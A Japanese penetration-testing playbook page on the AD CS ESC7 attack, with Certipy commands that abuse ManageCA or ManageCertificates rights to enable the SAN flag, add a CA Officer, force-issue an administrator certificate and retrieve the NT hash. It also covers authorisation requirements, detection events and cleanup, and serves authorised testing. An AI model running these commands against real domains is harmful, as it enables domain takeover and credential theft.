# ESC7 — Vulnerable CA ACL（ManageCA / ManageCertificates）

> **[HIGH IMPACT]** 本攻撃は以下の理由で本番では原則禁止または個別合意必須：
> - [x] 不可逆な設定変更を含む（CA フラグ変更・CA Officer 追加は CA 設定を直接変更する）
> - [x] 持続化に該当（CA Officer 権限が残るとバックドアになる。証明書も持続化経路）
> - [x] SIEM/EDR で確実に検知される（Event ID 4886・4887・MDI アラート）
> - [x] 業務停止リスク（CA 設定の誤操作は PKI 全体の停止につながる）
>
> 実施可否は事前合意で明示確認すること。CA 設定変更は書面承認必須。
> 演習環境では制約なし。

---

## 着火条件

以下のいずれかが Certipy の出力で確認できるときに実施する：

- `[!] Vulnerabilities: ESC7` が表示されている
- または `Access Rights` に低権限ユーザーが以下のいずれかを持つ：
  - `ManageCA`（CA 管理権限：CA フラグ変更・CA Officer 追加が可能）
  - `ManageCertificates`（証明書管理権限：承認待ち証明書の強制発行が可能）

**攻撃者の思考トレース：** ManageCA 権限は CA の設定そのものを変更できる。`EDITF_ATTRIBUTESUBJECTALTNAME2` フラグ（ESC6 の条件）を自分で有効化できるため、その後は任意の UPN で証明書を申請できる（ESC6 相当の成果）。ManageCertificates 権限は承認待ち（Pending）の証明書を強制発行できるため、`Requires Manager Approval: True` のテンプレート（ESC1/ESC6 の阻害要因）を迂回できる。

---

## 環境前提

- **実行環境**: テスター端末（対象権限を持つドメインユーザーとして認証済み）
- **必要なツール**: Certipy（`pip install certipy-ad --break-system-packages`）
- **必要な権限**: CA の `ManageCA` または `ManageCertificates` 権限（低権限ユーザーへの誤付与が条件）
- **オフライン代替**: `certutil -setreg` による手動 CA フラグ変更（Windows 端末・CA サーバーへの直接アクセス要）

---

## 観点・着眼点

### 先に確認すること：CA ACL の権限確認

```bash
# [Attacker] CA の権限を含む詳細列挙
certipy find \
  -u [USER]@[DOMAIN] \
  -p [PASSWORD] \
  -dc-ip [DC_IP] \
  -vulnerable \
  -stdout
```

ESC7 の出力例：

```
Certificate Authorities
  0
    CA Name                             : [CA_NAME]
    ...
    Permissions
      Access Rights
        ManageCA                        : EXAMPLE.LOCAL\[LOW_PRIV_USER]   ← ManageCA あり
        ManageCertificates              : EXAMPLE.LOCAL\Domain Admins
        Enroll                          : EXAMPLE.LOCAL\Authenticated Users
    [!] Vulnerabilities
      ESC7                              : 'EXAMPLE.LOCAL\[LOW_PRIV_USER]' has dangerous
                                          CA permissions
```

### 権限による使い分け

| 保有権限 | 攻撃経路 | 成果 |
|---------|---------|------|
| ManageCA のみ | ESC6 フラグを自分で有効化 → ESC6 相当の手順 | 任意ユーザーで証明書取得 |
| ManageCA のみ | 自分を CA Officer（ManageCertificates）に追加 → ManageCertificates 経路へ | 承認待ち証明書の強制発行 |
| ManageCertificates のみ | `Requires Manager Approval: True` のテンプレートに申請 → 自分で承認 | ESC1/ESC6 の Manager Approval 迂回 |
| 両方 | 上記すべて | 最も広い攻撃面 |

---

## 手順

事前準備（必須）：時刻同期

```bash
# [Attacker] DC との時刻同期
sudo ntpdate -u [DC_IP]
```

### ルートA：ManageCA → ESC6 フラグを有効化

```bash
# [Attacker] Step 1: EDITF_ATTRIBUTESUBJECTALTNAME2 フラグを CA で有効化
certipy ca \
  -ca [CA_NAME] \
  -u [USER]@[DOMAIN] \
  -p [PASSWORD] \
  -dc-ip [DC_IP] \
  -enable-san
# → 「User Specified SAN: Enabled」に変更される

# [Attacker] Step 2: ESC6 手順で証明書申請
certipy req \
  -ca [CA_NAME] \
  -template User \
  -u [USER]@[DOMAIN] \
  -p [PASSWORD] \
  -dc-ip [DC_IP] \
  -upn administrator@[DOMAIN]

# [Attacker] Step 3: PKINIT 認証 → NT ハッシュ取得
certipy auth -pfx administrator.pfx -dc-ip [DC_IP]
```

### 原状回復（ルートA）：SAN フラグを無効に戻す

```bash
# [Attacker] EDITF_ATTRIBUTESUBJECTALTNAME2 フラグを無効化（原状回復・必須）
certipy ca \
  -ca [CA_NAME] \
  -u [USER]@[DOMAIN] \
  -p [PASSWORD] \
  -dc-ip [DC_IP] \
  -disable-san
```

### ルートB：ManageCA → 自分を CA Officer に追加 → ManageCertificates で Pending 証明書を発行

```bash
# [Attacker] Step 1: 自分を CA Officer（ManageCertificates 権限）に追加
certipy ca \
  -ca [CA_NAME] \
  -u [USER]@[DOMAIN] \
  -p [PASSWORD] \
  -dc-ip [DC_IP] \
  -add-officer [USER]
# → [USER] が CA Officer に追加される

# [Attacker] Step 2: Manager Approval が必要なテンプレートで証明書申請（Pending 状態になる）
certipy req \
  -ca [CA_NAME] \
  -template [REQUIRES_APPROVAL_TEMPLATE] \
  -u [USER]@[DOMAIN] \
  -p [PASSWORD] \
  -dc-ip [DC_IP] \
  -upn administrator@[DOMAIN]
# → 申請は Pending となり REQUEST_ID が返される

# [Attacker] Step 3: Pending 証明書を自分の ManageCertificates 権限で発行
certipy ca \
  -ca [CA_NAME] \
  -u [USER]@[DOMAIN] \
  -p [PASSWORD] \
  -dc-ip [DC_IP] \
  -issue-request [REQUEST_ID]

# [Attacker] Step 4: 発行済み証明書を取得
certipy req \
  -ca [CA_NAME] \
  -u [USER]@[DOMAIN] \
  -p [PASSWORD] \
  -dc-ip [DC_IP] \
  -retrieve [REQUEST_ID]
# → administrator.pfx が取得できる

# [Attacker] Step 5: PKINIT 認証 → NT ハッシュ取得
certipy auth -pfx administrator.pfx -dc-ip [DC_IP]
```

### 原状回復（ルートB）：CA Officer 権限の削除

```bash
# [Attacker] 追加した CA Officer 権限を削除（原状回復・必須）
certipy ca \
  -ca [CA_NAME] \
  -u [USER]@[DOMAIN] \
  -p [PASSWORD] \
  -dc-ip [DC_IP] \
  -remove-officer [USER]
```

---

## 刺さらなかったとき

| 状況 | 対処 |
|------|------|
| `certipy ca -enable-san` が `ACCESS_DENIED` | ManageCA 権限がない、または LDAP での CA アクセスが制限されている。`nxc ldap` で権限確認 |
| ルートA で ESC6 化したが `certipy auth` が失敗する | KB5014754 パッチ適用済みで Strong Mapping が有効。ESC7 ルートB（ManageCertificates）へ |
| ルートB で `-issue-request` が拒否される | ManageCertificates 権限が正しく付与されていない。`-add-officer` の成功を `certipy find` で確認する |
| Manager Approval 必須のテンプレートに `Enrollee Supplies Subject: False` で ESC6 未有効 | ルートA で SAN フラグを有効にしてから再試行 |

---

## 注意点・落とし穴

- **CA Officer 権限の削除漏れはバックドアになる**：`-add-officer` で追加した権限は必ず削除する
- **`-enable-san` は CA 全体の設定変更**：有効化している間は全テンプレートで SAN 自由指定が可能な状態になる。変更直後に証明書を取得してすぐに `-disable-san` で元に戻す
- **ESC7 は ManageCA または ManageCertificates のどちらか一方でも条件を満たす**：権限確認は片方だけ見て終わりにしない

---

## 本番での前提

- **事前合意の要否**: ★★★（書面承認必須）。CA 設定変更はドメイン全体の PKI に影響
- **想定されるSIEM/EDR検知**: Event ID 4886・4887（証明書発行）/ CA 設定変更イベント / MDI「CA 設定の不審な変更」
- **業務影響リスク**: SAN フラグ有効化中は CA 全体が影響。Officer 追加は CA 設定変更として記録される
- **原状回復必須項目**: ✅ SAN フラグを無効化（`-disable-san`）/ ✅ 追加した CA Officer 権限を削除（`-remove-officer`）/ ✅ 発行した証明書を CA で失効 / ✅ pfx・NT ハッシュ・TGT の暗号化保管・テスト完了時破棄
- **取得情報の取扱**: pfx ファイル・NT ハッシュ・TGT は暗号化保管、テスト完了後破棄
- **演習環境での扱い**: 制約なし（HTB / OSCP 等は本セクション全項目をスキップしてよい）

---

## 関連技術

- 前：AD CS の列挙と ESC 番号の特定 → `./Overview.md`
- 前：ESC6（ManageCA で有効化した SAN フラグを使った証明書申請） → `./ESC6.md`
- 後：PKINIT → NT ハッシュ取得 → DCSync → `../Credential_Dumping.md`
- ツール詳細 → `../../05_Tools_Reference/Certipy.md`
